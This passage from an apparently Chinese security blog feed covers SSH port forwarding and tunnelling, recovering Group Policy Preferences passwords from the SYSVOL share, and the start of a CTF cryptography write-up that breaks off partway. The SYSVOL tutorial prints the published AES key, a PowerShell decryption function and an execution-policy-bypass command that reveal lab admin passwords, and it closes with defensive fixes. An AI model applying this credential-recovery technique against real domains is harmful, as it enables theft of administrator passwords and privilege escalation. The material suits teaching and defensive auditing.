<p>没做转发之前，我们访问 8080 端口会显示失败，但是做了转发以后就可以访问到了。</p>
<p>我们再来把远端的 22 端口转发到本地的 8080 端口试试：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ssh <span class="token operator">-</span>L <span class="token number">80</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>VPS<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">22</span> <span class="token operator">-</span>fN <span class="token operator">&lt;</span>vps<span class="token operator">></span></pre></td></tr></table></figure><p>使用 SSH 连接本地的 8080 端口，看看结果：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102193133142.png" alt="image-20220102193133142" /></p>
<p>连上后请求一下外网 IP 确实是我们设定好的主机 IP，所以算是成功了</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>SSH隧道可以作为CS和MSF的联动</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>动态转发</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>使用动态转发就可以直接使用socks4<span class="token operator">/</span><span class="token number">5</span>的隧道：</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>ssh <span class="token operator">-</span>CfNg <span class="token operator">-</span>D <span class="token number">8080</span><span class="token punctuation">:</span>VPS</pre></td></tr></table></figure><h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvLXR5U3d1M2VmdFZZbnc4V0dtcFZKdw==">内网渗透中的隧道</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透技巧——利用SYSVOL还原组策略中保存的密码</title>
    <url>/article/f6eb5c38.html</url>
    <content><![CDATA[<h2 id="00x00-前言"><a class="anchor" href="#00x00-前言">#</a> 00x00 前言</h2>
<hr />
<p><code>Local Administrator Password Solution</code> （ <code>LAPS</code> ）最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。那么，如果域内未配置 <code>LAPS</code> ，如何批量设置域内主机的本地管理员密码呢？这其中又存在哪些可被利用的地方呢？</p>
<p><strong>注</strong>：如要完美实现建议选用 <code>Server 2003</code>  系统！！！这里小编使用 <code>Server 2012</code>  的域控，由于不支持 <code>KB2962486</code>  补丁所以会导致部分功能无法完全实现。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211155128260.png" alt="image-20211211155128260" /></p>
<h2 id="00x01-域内共享文件夹sysvol介绍"><a class="anchor" href="#00x01-域内共享文件夹sysvol介绍">#</a> 00x01 域内共享文件夹 \SYSVOL 介绍</h2>
<hr />
<p>在域中，存在一个默认的共享路径：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\<span class="token operator">&lt;</span><span class="token constant">DOMAIN</span><span class="token operator">></span>\<span class="token constant">SYSVOL</span>\<span class="token operator">&lt;</span><span class="token constant">DOMAIN</span><span class="token operator">></span>\</pre></td></tr></table></figure><p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p>
<p>例如，测试主机所在域为 <code>21r000.org</code> ，可访问共享文件夹 <code>\\21r000.org\SYSVOL\21r000.org</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211140714629.png" alt="image-20211211140714629" /></p>
<h2 id="00x02-域管理员批量修改域内主机本地管理员密码的方法"><a class="anchor" href="#00x02-域管理员批量修改域内主机本地管理员密码的方法">#</a> 00x02 域管理员批量修改域内主机本地管理员密码的方法</h2>
<hr />
<h3 id="1-测试server-2012系统"><a class="anchor" href="#1-测试server-2012系统">#</a> 1、测试 Server 2012 系统</h3>
<p>对于 <code>server2012</code> ，想要批量修改域内主机本地管理员密码，常常通过配置组策略执行 <code>vbs</code>  脚本的方式</p>
<p>给出一个修改密码的 <code>vbs</code>  脚本 (实现方式不唯一)，代码如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>strComputer <span class="token operator">=</span> <span class="token string">"."</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Set objUser <span class="token operator">=</span> <span class="token function">GetObject</span><span class="token punctuation">(</span><span class="token string">"WinNT://"</span> <span class="token operator">&amp;</span> strComputer <span class="token operator">&amp;</span> <span class="token string">"/Administrator, user"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>objUser<span class="token punctuation">.</span>SetPassword <span class="token string">"21r000@test666"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>objUser<span class="token punctuation">.</span>SetInfo</pre></td></tr></table></figure><p>这种实现方式，最大的弊端在于修改后的密码会明文保存在 <code>vbs</code>  脚本中，而该 <code>vbs</code>  脚本通常会保存在共享文件夹 <code>\SYSVOL</code></p>
<p>这就存在一个隐患：任何域用户都能读取该 <code>vbs</code>  脚本，也就能够获取脚本中保存的明文密码</p>
<h3 id="2-测试server-2012系统"><a class="anchor" href="#2-测试server-2012系统">#</a> 2、测试 Server 2012 系统</h3>
<p>使用 <code>Group Policy Preferences</code>  配置组策略批量修改用户本地管理员密码，具体方法如下：</p>
<p>开始 - 全部应用 - 组策略管理</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211141412684.png" alt="image-20211211141412684" /></p>
<p>选中域 <code>21r000.org</code>  后，右键，选中 “在这个域中创建 <code>GPO</code>  并在此处链接”</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211141528644.png" alt="image-20211211141528644" /></p>
<h4 id="设置名称为test666"><a class="anchor" href="#设置名称为test666">#</a> 设置名称为 test666</h4>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211141641888.png" alt="image-20211211141641888" /></p>
<p><code>test666</code>  - 设置 - 右键 - 编辑</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211141735273.png" alt="image-20211211141735273" /></p>
<p>用户配置 - 首选项 - 控制面板设置 - 本地用户和组</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211141928649.png" alt="image-20211211141928649" /></p>
<p>右键新建本地用户更新， <code>administrator</code>  (内置), 设置密码为 <code>21r000@test666</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211142316768.png" alt="image-20211211142316768" /></p>
<h4 id="委派设置权限"><a class="anchor" href="#委派设置权限">#</a> 委派，设置权限</h4>
<p>在详细一栏，可看到该策略对应的 ID 为 <code>&#123;4CEB170F-B356-4BBD-90A6-1AB86412565A&#125;</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211150132302.png" alt="image-20211211150132302" /></p>
<p>至此，组策略配置完成，域内主机重新登录，即可应用此策略</p>
<p>在共享文件夹 <code>\SYSVOL</code>  中可看到组策略对应 <code>ID</code>  的文件夹</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\21r000<span class="token punctuation">.</span>org\<span class="token constant">SYSVOL</span>\21r000<span class="token punctuation">.</span>org\Policies\<span class="token punctuation">&#123;</span>4CEB170F<span class="token operator">-</span><span class="token constant">B356</span><span class="token operator">-</span>4BBD<span class="token operator">-</span>90A6<span class="token operator">-</span>1AB86412565A<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211150535645.png" alt="image-20211211150535645" /></p>
<p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件 <code>Groups.xml</code> ，具体路径如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\21r000<span class="token punctuation">.</span>org\<span class="token constant">SYSVOL</span>\21r000<span class="token punctuation">.</span>org\Policies\<span class="token punctuation">&#123;</span>4CEB170F<span class="token operator">-</span><span class="token constant">B356</span><span class="token operator">-</span>4BBD<span class="token operator">-</span>90A6<span class="token operator">-</span>1AB86412565A<span class="token punctuation">&#125;</span>\User\Preferences\Groups</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211150617501.png" alt="image-20211211150617501" /></p>
<p><code>Groups.xml</code>  内容如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span> <span class="token operator">?</span><span class="token operator">></span> </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> <span class="token operator">&lt;</span>Groups clsid<span class="token operator">=</span><span class="token string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span> <span class="token operator">&lt;</span>User clsid<span class="token operator">=</span><span class="token string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> name<span class="token operator">=</span><span class="token string">"Administrator (内置)"</span> image<span class="token operator">=</span><span class="token string">"2"</span> changed<span class="token operator">=</span><span class="token string">"2021-12-11 07:01:12"</span> uid<span class="token operator">=</span><span class="token string">"&#123;856CE2F7-9053-48B5-BDAD-5C463D2CE3E0&#125;"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token operator">&lt;</span>Properties action<span class="token operator">=</span><span class="token string">"U"</span> newName<span class="token operator">=</span><span class="token string">""</span> fullName<span class="token operator">=</span><span class="token string">""</span> description<span class="token operator">=</span><span class="token string">""</span> cpassword<span class="token operator">=</span><span class="token string">"SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc"</span> changeLogon<span class="token operator">=</span><span class="token string">"0"</span> noChange<span class="token operator">=</span><span class="token string">"0"</span> neverExpires<span class="token operator">=</span><span class="token string">"0"</span> acctDisabled<span class="token operator">=</span><span class="token string">"0"</span> subAuthority<span class="token operator">=</span><span class="token string">"RID_ADMIN"</span> userName<span class="token operator">=</span><span class="token string">"Administrator (内置)"</span> <span class="token operator">/</span><span class="token operator">></span> </pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token operator">&lt;</span><span class="token operator">/</span>User<span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token operator">&lt;</span><span class="token operator">/</span>Groups<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211150646270.png" alt="image-20211211150646270" /></p>
<p>值得注意的是其中的 <code>cpassword</code>  项，保存的是加密后的内容：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc</pre></td></tr></table></figure><p>加密方式为 <code>AES 256</code> ，虽然目前 <code>AES 256</code>  很难被攻破，但是微软选择公开了该 <code>AES 256</code>  加密的私钥</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9jYzQyMjkyNC5hc3B4">地址链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211150846986.png" alt="image-20211211150846986" /></p>
<p>借助该私钥，我们就能还原出明文。</p>
<p>还原方式可采用 <code>Chris Campbell @obscuresec</code>  开源的 <code>powershell</code>  脚本 <code>Get-GPPPassword.ps1</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC90cmVlL21hc3Rlci9FeGZpbHRyYXRpb24=">项目链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211151842507.png" alt="image-20211211151842507" /></p>
<p>该脚本可在域内主机上执行，能够自动查询共享文件夹 <code>\SYSVOL</code>  中的文件，还原出所有明文密码</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>powershell <span class="token operator">-</span>executionpolicy bypass <span class="token operator">-</span>file Get<span class="token operator">-</span>GPPPassword<span class="token punctuation">.</span>ps1</pre></td></tr></table></figure><p>当然，仅仅为了解密 <code>cpassword=&quot;SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc&quot;</code> ，我们可以对以上 <code>powershell</code>  脚本的功能简化</p>
<p>简化代码如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> Get<span class="token operator">-</span>DecryptedCpassword <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token punctuation">[</span><span class="token function">CmdletBinding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token function">Param</span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token punctuation">[</span>string<span class="token punctuation">]</span> $Cpassword </pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        #Append appropriate padding based on string length  </pre></td></tr><tr><td data-num="9"></td><td><pre>        $Mod <span class="token operator">=</span> <span class="token punctuation">(</span>$Cpassword<span class="token punctuation">.</span>length <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        </pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>$Mod<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token string">'1'</span> <span class="token punctuation">&#123;</span>$Cpassword <span class="token operator">=</span> $Cpassword<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>$Cpassword<span class="token punctuation">.</span>Length <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token string">'2'</span> <span class="token punctuation">&#123;</span>$Cpassword <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> $Mod<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token string">'3'</span> <span class="token punctuation">&#123;</span>$Cpassword <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> $Mod<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>        $Base64Decoded <span class="token operator">=</span> <span class="token punctuation">[</span>Convert<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>$Cpassword<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        </pre></td></tr><tr><td data-num="19"></td><td><pre>        #Create a <span class="token keyword">new</span> <span class="token class-name">AES</span> <span class="token punctuation">.</span><span class="token constant">NET</span> Crypto Object</pre></td></tr><tr><td data-num="20"></td><td><pre>        $AesObject <span class="token operator">=</span> New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography<span class="token punctuation">.</span>AesCryptoServiceProvider</pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">[</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> $AesKey <span class="token operator">=</span> @<span class="token punctuation">(</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0xfa</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                             <span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x9b</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0xa4</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        </pre></td></tr><tr><td data-num="24"></td><td><pre>        #Set <span class="token constant">IV</span> to all nulls to prevent dynamic generation <span class="token keyword">of</span> <span class="token constant">IV</span> value</pre></td></tr><tr><td data-num="25"></td><td><pre>        $AesIV <span class="token operator">=</span> New<span class="token operator">-</span>Object Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$AesObject<span class="token punctuation">.</span><span class="token constant">IV</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="26"></td><td><pre>        $AesObject<span class="token punctuation">.</span><span class="token constant">IV</span> <span class="token operator">=</span> $AesIV</pre></td></tr><tr><td data-num="27"></td><td><pre>        $AesObject<span class="token punctuation">.</span>Key <span class="token operator">=</span> $AesKey</pre></td></tr><tr><td data-num="28"></td><td><pre>        $DecryptorObject <span class="token operator">=</span> $AesObject<span class="token punctuation">.</span><span class="token function">CreateDecryptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">[</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> $OutBlock <span class="token operator">=</span> $DecryptorObject<span class="token punctuation">.</span><span class="token function">TransformFinalBlock</span><span class="token punctuation">(</span>$Base64Decoded<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $Base64Decoded<span class="token punctuation">.</span>length<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        </pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>UnicodeEncoding<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>Unicode<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span>$OutBlock<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="33"></td><td><pre>    </pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>Write<span class="token operator">-</span>Error $Error<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="36"></td><td><pre>Get<span class="token operator">-</span>DecryptedCpassword <span class="token string">"SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc"</span></pre></td></tr></table></figure><p>还原出明文密码为 <code>21r000@test666</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211152350388.png" alt="image-20211211152350388" /></p>
<h2 id="00x03-组策略中可被利用的地方"><a class="anchor" href="#00x03-组策略中可被利用的地方">#</a> 00x03 组策略中可被利用的地方</h2>
<hr />
<p>组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下：</p>
<p><code>Services\Services.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjOTgwMDcwKHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)</span></li>
</ul>
<p><code>ScheduledTasks\ScheduledTasks.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNDIyOTIwKHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)</span></li>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2RkMzQxMzUwKHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)</span></li>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2RkMzA0MTE0KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)</span></li>
</ul>
<p><code>Printers\Printers.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNDIyOTE4KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)</span></li>
</ul>
<p><code>Drives\Drives.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNzA0NTk4KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)</span></li>
</ul>
<p><code>DataSources\DataSources.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNDIyOTI2KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</span></li>
</ul>
<p>注：以上位置并不绝对，在配置时需要在组策略中填入用户名密码，对应的 <code>Groups.xml</code>  才会包含 <code>cpassword</code>  属性，才能用于还原明文。</p>
<p>可以拿计划任务来举例，对应 <code>ScheduledTasks.xml</code>  的位置</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\21r000<span class="token punctuation">.</span>org\<span class="token constant">SYSVOL</span>\21r000<span class="token punctuation">.</span>org\Policies\<span class="token punctuation">&#123;</span>4CEB170F<span class="token operator">-</span><span class="token constant">B356</span><span class="token operator">-</span>4BBD<span class="token operator">-</span>90A6<span class="token operator">-</span>1AB86412565A<span class="token punctuation">&#125;</span>\User\Preferences\ScheduledTasks</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211154122408.png" alt="image-20211211154122408" /></p>
<p>组策略配置的位置为：用户配置 - 首选项 - 控制面板设置 - 计划任务</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211153200453.png" alt="image-20211211153200453" /></p>
<p>新建计划任务，设置名称为： <code>test111</code> ，需要选中运行身份，填入用户名 <code>test111</code>  和密码 <code>test@111</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211153508588.png" alt="image-20211211153508588" /></p>
<p>如未输入用户名和密码，则 <code>ScheduledTasks.xml</code>  文件中不会包含 <code>cpassword</code>  属性，如下图</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211153735339.png" alt="image-20211211153735339" /></p>
<p>填入了测试密码后对应的 <code>ScheduledTasks.xml</code>  才会包含 <code>cpassword</code>  属性</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mZC5nKiO6yVR2yFD4YZ3umRzNBgRZlODkPDNkaEFQgI</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211153947688.png" alt="image-20211211153947688" /></p>
<p>使用 <code>powershell</code>  对其解密，还原出密码为： <code>test@111</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211154232881.png" alt="image-20211211154232881" /></p>
<p>至此得出结论：</p>
<p>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹 <code>\SYSVOL</code>  下，默认所有域内用户可访问，虽然被加密，但很容易被解密</p>
<p>这就造成了安全隐患，现实中域管理员往往会在组策略中使用域管理员密码，组策略配置文件中的密码很容易被获得，导致权限提升</p>
<p>为此，微软发布了补丁 <code>KB2962486</code> 。<br />
<span class="exturl" data-url="aHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vbGlicmFyeS9zZWN1cml0eS9tczE0LTAyNQ==">KB2962486 下载链接</span></p>
<p>系统打了补丁后，组策略中无法设置用户名密码，如下图</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211154702166.png" alt="image-20211211154702166" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211154715101.png" alt="image-20211211154715101" /></p>
<p>当然，共享文件夹 <code>\SYSVOL</code>  下的 <code>xml</code>  文件也就不再包含 <code>cpassword</code>  属性</p>
<p><strong>注</strong>： <code>xml</code>  文件还是会和组策略保持同步</p>
<h2 id="00x04-防御"><a class="anchor" href="#00x04-防御">#</a> 00x04 防御</h2>
<hr />
<p>结合攻击方法，可供选择的防御方法如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>使用<span class="token constant">LAPS</span>批量管理域内主机本地管理员帐户</pre></td></tr><tr><td data-num="2"></td><td><pre>域控安装补丁<span class="token constant">KB2962486</span></pre></td></tr><tr><td data-num="3"></td><td><pre>不在组策略中使用域控密码</pre></td></tr><tr><td data-num="4"></td><td><pre>设置共享文件夹\<span class="token constant">SYSVOL</span>的访问权限</pre></td></tr><tr><td data-num="5"></td><td><pre>使用PsPasswd批量修改域内主机本地管理员密码</pre></td></tr></table></figure><h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLyVFNSU5RiU5RiVFNiVCOCU5NyVFOSU4MCU4Ri0lRTUlODglQTklRTclOTQlQThTWVNWT0wlRTglQkYlOTglRTUlOEUlOUYlRTclQkIlODQlRTclQUQlOTYlRTclOTUlQTUlRTQlQjglQUQlRTQlQkYlOUQlRTUlQUQlOTglRTclOUElODQlRTUlQUYlODYlRTclQTAlODE=">域渗透 —— 利用 SYSVOL 还原组策略中保存的密码</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届浙江省大学生网络与信息安全竞赛（决赛）dssssa1及easyNTRU复现</title>
    <url>/article/8f0d21b8.html</url>
    <content><![CDATA[<h2 id="dssssa1"><a class="anchor" href="#dssssa1">#</a> dssssa1</h2>
<p>附件下载得到的 encode 脚本：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="3"></td><td><pre>from gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre>from hashlib <span class="token keyword">import</span> sha1</pre></td></tr><tr><td data-num="5"></td><td><pre>from secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> <span class="token function">bytes_to_long</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token 